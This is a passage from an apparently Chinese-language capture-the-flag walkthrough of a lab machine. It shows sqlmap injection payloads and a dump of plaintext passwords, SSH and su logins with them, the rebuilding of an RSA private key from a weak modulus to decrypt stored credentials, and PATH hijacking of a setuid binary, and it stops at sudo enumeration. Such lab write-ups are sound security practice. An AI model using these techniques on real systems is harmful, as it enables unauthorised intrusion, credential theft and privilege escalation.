[09:35:23] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '</span>--dbms<span class="token operator">=</span>mysql<span class="token string">') 
[09:35:24] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">21</span> to <span class="token number">40</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">41</span> to <span class="token number">60</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">61</span> to <span class="token number">80</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">81</span> to <span class="token number">100</span> columns<span class="token string">'
[09:35:24] [INFO] checking if the injection point on GET parameter '</span><span class="token function">id</span><span class="token string">' is a false positive
GET parameter '</span><span class="token function">id</span><span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 221 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1'</span> AND <span class="token assign-left variable">4156</span><span class="token operator">=</span><span class="token number">4156</span> AND <span class="token string">'svBS'</span><span class="token operator">=</span><span class="token string">'svBS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1'</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">5758</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>jvcJ<span class="token punctuation">)</span> AND <span class="token string">'IDpr'</span><span class="token operator">=</span><span class="token string">'IDpr
---
[09:35:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:35:24] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 156 times
[09:35:24] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/172.17.0.3'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:35:24 /2024-07-17/</code></pre>
<p>确实存在sql注入,搜集信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> creds
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> example
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> creds <span class="token parameter variable">--tables</span>
<span class="token function">users</span></code></pre>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; sqlmap -u &quot;http:&#x2F;&#x2F;172.17.0.3&#x2F;admin&#x2F;index.php?id&#x3D;1&quot; --proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:10088&quot; --batch -D creds -T users --dump
+-------------------+----------+
| password          | username |
+-------------------+----------+
| beltran48         | marco    |
| iamoswe2023!      | txhaka   |
| superrootpassword | root     |
+-------------------+----------+</code></pre>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>拿到三组用户名，登了一下发现只有<code>txhaka</code>可以登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> proxychains <span class="token function">ssh</span> txhaka@172.17.0.3                                                                                                             
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:10088  <span class="token punctuation">..</span>.  <span class="token number">172.17</span>.0.3:22  <span class="token punctuation">..</span>.  OK
The authenticity of <span class="token function">host</span> <span class="token string">'172.17.0.3 (172.17.0.3)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:MclgaIFcKHnKBJxp/4+QZYCN7VmpZu/Qt2QEvqYriNo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">172.17</span>.0.3<span class="token string">' (ED25519) to the list of known hosts.
txhaka@172.17.0.3'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.1 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-60-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that <span class="token function">users</span> <span class="token keyword">do</span> not log into.

To restore this content, you can run the <span class="token string">'unminimize'</span> command.
Last login: Thu Feb <span class="token number">16</span> 02:49:04 <span class="token number">2023</span> from <span class="token number">172.17</span>.0.1
txhaka@a3e5e05c03c8:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">txhaka@a3e5e05c03c8:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-x--- <span class="token number">1</span> txhaka txhaka <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> txhaka txhaka   <span class="token number">73</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> txhaka txhaka  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> txhaka txhaka <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> txhaka txhaka <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
-rw-r--r-- <span class="token number">1</span> txhaka txhaka  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
-r-------- <span class="token number">1</span> txhaka txhaka  <span class="token number">288</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
txhaka@a3e5e05c03c8:~$ <span class="token function">cat</span> flag.txt 

█▀ █▀█ █   █   █▄▄ █▀█ █▀█ █   █▀▀ ▄▀█ █▄ █
▄█ ▀▀█ █▄▄ █   █▄█ █▄█ █▄█ █▄▄ ██▄ █▀█ █ ▀█

Flag <span class="token number">5</span>: HELL<span class="token punctuation">&#123;</span>7H3_B00L34N_15_4150_4_VU1N<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag5说明一切正常，用sql注入得到的密码登录root登录成功，原来root没有配ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">txhaka@a3e5e05c03c8:/home$ <span class="token function">su</span> 
Password: 
root@a3e5e05c03c8:/home<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># ls -al</span>
total <span class="token number">40</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Jul <span class="token number">17</span> 00:53 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> root root   <span class="token number">52</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">15</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw------- <span class="token number">1</span> root root <span class="token number">1321</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .mysql_history
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
drwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> creds
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">273</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">132</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> message.txt
root@a3e5e05c03c8:~<span class="token comment"># cat flag.txt </span>

█▀█ █▀█ █▀█ ▀█▀         ▄▀█ █▀▀ ▄▀█ █ █▄ █
█▀▄ █▄█ █▄█  █  ▄ ▄ ▄   █▀█ █▄█ █▀█ █ █ ▀█

Flag <span class="token number">6</span>: HELL<span class="token punctuation">&#123;</span>7H3_5QL1_15_7H3_K3Y<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag6，读一下message</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># cat message.txt </span>

From: pascualropi@hell.h4u

Hi, I have left <span class="token function">ssh</span> credentials <span class="token keyword">in</span> the .enc file, remember to decrypt it with your private rsa key <span class="token builtin class-name">:</span><span class="token punctuation">)</span></code></pre>
<p>看起来像是解密rsa</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># cd creds</span>
root@a3e5e05c03c8:~/creds<span class="token comment"># ls -al</span>
total <span class="token number">16</span>
drwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">129</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> creds.enc
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">451</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> public.crt</code></pre>
<p>先提取出来公钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 RsaCtfTool.py <span class="token parameter variable">--dumpkey</span> <span class="token parameter variable">--key</span> <span class="token punctuation">..</span>/public.crt 
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Using native python functions <span class="token keyword">for</span> math, <span class="token function">which</span> is slow. <span class="token function">install</span> gmpy2 with: <span class="token string">'python3 -m pip install &lt;module>'</span><span class="token builtin class-name">.</span>
private argument is not set, the private key will not be displayed, even <span class="token keyword">if</span> recovered.
None
n: <span class="token number">279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517</span>
e: <span class="token number">115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png" alt="ORxz9b.png" loading="lazy"><br>n能分解我是没想到的,直接构建私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">from Crypto.PublicKey <span class="token function">import</span> RSA
from gmpy2 <span class="token function">import</span> *
<span class="token assign-left variable">n</span><span class="token operator">=</span><span class="token number">279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517</span>
<span class="token assign-left variable">e</span><span class="token operator">=</span><span class="token number">115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139</span>
<span class="token assign-left variable">p</span><span class="token operator">=</span><span class="token number">13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083</span>
<span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199</span>
<span class="token assign-left variable">phi</span><span class="token operator">=</span><span class="token punctuation">(</span>p-1<span class="token punctuation">)</span>*<span class="token punctuation">(</span>q-1<span class="token punctuation">)</span>
<span class="token assign-left variable">d</span><span class="token operator">=</span>int<span class="token punctuation">(</span>gmpy2.invert<span class="token punctuation">(</span>e,phi<span class="token punctuation">))</span>
key <span class="token operator">=</span> RSA.construct<span class="token variable"><span class="token punctuation">((</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">))</span></span>
print<span class="token punctuation">(</span>key.exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span>.decode<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----</code></pre>
<p>解密一下文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>  openssl pkeyutl <span class="token parameter variable">-decrypt</span> <span class="token parameter variable">-inkey</span> aaa  <span class="token parameter variable">-in</span> creds.enc

Credentials <span class="token keyword">for</span> <span class="token for-or-select variable">ssh</span> <span class="token keyword">in</span> hell:

Username: pascual
Password: vulnwhatsapp123<span class="token operator">!</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> pascual@192.168.56.199  
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.199 (192.168.56.199)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:aUSoZyYPezlPKdiG/TOw1clwpRm5PrR4RkQxZSy7JnE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.199<span class="token string">' (ED25519) to the list of known hosts.
pascual@192.168.56.199'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.1 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-60-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that <span class="token function">users</span> <span class="token keyword">do</span> not log into.

To restore this content, you can run the <span class="token string">'unminimize'</span> command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Thu Feb <span class="token number">16</span> 07:33:38 <span class="token number">2023</span> from <span class="token number">192.168</span>.193.129
pascual@hell:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x--- <span class="token number">5</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> pascual pascual  <span class="token number">295</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> pascual pascual  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> pascual pascual <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
drwxrwxr-x <span class="token number">3</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> pascual pascual  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
drwxrwxr-x <span class="token number">2</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .ssh
-r-------- <span class="token number">1</span> pascual pascual  <span class="token number">275</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
pascual@hell:~$ <span class="token function">cat</span> flag.txt 

█▀█ ▄▀█ █▀ █▀▀ █ █ ▄▀█ █   █▀█ █▀█ █▀█ █
█▀▀ █▀█ ▄█ █▄▄ █▄█ █▀█ █▄▄ █▀▄ █▄█ █▀▀ █

Flag <span class="token number">7</span>: HELL<span class="token punctuation">&#123;</span>R54C7F7001_OR_M4NU41?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第七个flag</p>
<h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">28</span>
drwxr-xr-x  <span class="token number">7</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-x---  <span class="token number">6</span> eddie   eddie   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> eddie
drwxr-x---  <span class="token number">6</span> gato    gato    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> gato
drwxr-x---  <span class="token number">5</span> ghost   ghost   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> ghost
drwxr-x---  <span class="token number">5</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> pascual
drwxr-x---  <span class="token number">3</span> run     run     <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> run</code></pre>
<p>home下好多人，不过都没权限看，一般user多先看一眼邮箱</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/var/mail$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxrwsr-x  <span class="token number">2</span> root    mail    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root    root    <span class="token number">4096</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-r--------  <span class="token number">1</span> eddie   eddie    <span class="token number">142</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> eddie
-r--------  <span class="token number">1</span> pascual pascual  <span class="token number">166</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> pascual
pascual@hell:/var/mail$ <span class="token function">cat</span> pascual 

From: eddiedota@hell.h4u

I have created a reports binary <span class="token keyword">in</span> /opt/reports/reports with <span class="token function">which</span> you can <span class="token builtin class-name">read</span> the reports by passing an identifier as an argumen</code></pre>
<p>看一下这个文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/opt/reports$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">24</span>
drwx------ <span class="token number">2</span> pascual pascual  <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">5</span> root    root     <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwsr-xr-x <span class="token number">1</span> eddie   eddie   <span class="token number">16208</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> reports</code></pre>
<p>通过base64传到kali，反编译看一下<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png" alt="ORxz9b.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORzm26.png" alt="ORzm26.png" loading="lazy"></p>
<p>可以看到这个cat是用的环境变量，所以可以使用环境变量劫持</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/opt/reports$ <span class="token builtin class-name">cd</span> /tmp
pascual@hell:/tmp$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PWD</span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span>
pascual@hell:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span>cat
pascual@hell:/tmp$ <span class="token function">chmod</span> +x <span class="token function">cat</span>
pascual@hell:/tmp$ /opt/reports/reports <span class="token number">0</span>

eddie@hell:/tmp$ </code></pre>
<p>把环境变量修复一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eddie@hell:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games
eddie@hell:/home/eddie$ <span class="token builtin class-name">cd</span> ~
eddie@hell:~$ <span class="token builtin class-name">cd</span> /home/eddie
eddie@hell:/home/eddie$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x--- <span class="token number">6</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> root  root  <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> eddie eddie  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> eddie eddie <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
drwxrwxr-x <span class="token number">3</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> eddie eddie  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
drwxrwxr-x <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .ssh
-r-------- <span class="token number">1</span> eddie eddie  <span class="token number">238</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
drwxrwxr-x <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> report
eddie@hell:/home/eddie$ <span class="token function">cat</span> flag.txt

█▀▀ █▀▄ █▀▄ █ █▀▀ █▀▄ █▀█ ▀█▀ ▄▀█
██▄ █▄▀ █▄▀ █ ██▄ █▄▀ █▄█  █  █▀█

Flag <span class="token number">8</span>: HELL<span class="token punctuation">&#123;</span>R3L4T1V3_R0U735_4R3_FUN<span class="token operator">!</span><span class="token punctuation">&#125;</span></code></pre>
<p>拿到第八个flag<br>继续读剩下的一个邮件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eddie@hell:/var/mail$ <span class="token function">cat</span> eddie

From: ghost@hall.h4u

Hi eddie, can you see my hacked facebook account, I leave you the last password I remember: MySuperSecurePassword123<span class="token operator">!</span></code></pre>
<p>拿到ghost的密码<code>MySuperSecurePassword123!</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">cat</span> flag.txt 

█▀█ █▄▄ █▀▀ ▀▄▀ █▀▀ █ █ █▀█ █▀ ▀█▀
█▄█ █▄█ █▀  █ █ █▄█ █▀█ █▄█ ▄█  █ 

Flag <span class="token number">9</span>: HELL<span class="token punctuation">&#123;</span>B14CKH47_H4CK3R_F4C3B00K_WTF?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第九个flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">cat</span> message.txt 

From: gatogamer1155@hell.h4u

Hi ghost, just a heads up I created a script <span class="token keyword">in</span> node.js that converts text to hexadecimal, I<span class="token string">'ll leave it at my home directory for you to try, it'</span>s called hex.js <span class="token builtin class-name">:</span><span class="token punctuation">)</span></code></pre>
<p>去gato目录看这个文件,不过得先提权到gato</p>
<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> ghost: 
Matching Defaults entries <span class="token keyword">for</span> ghost on hell:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin, use_pty

User ghost may run the following commands on hell:
    <span class="token punctuation">(</span>gato<span class="token punctuation">)</span> /usr/bin/node /home/gato/*</code></pre>
<p>可以将gato目录下面的文件执行node命令,好眼熟，尝试目录穿越</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ghost@hell:~$ <span class="token builtin class-name">cd</span> /tmp
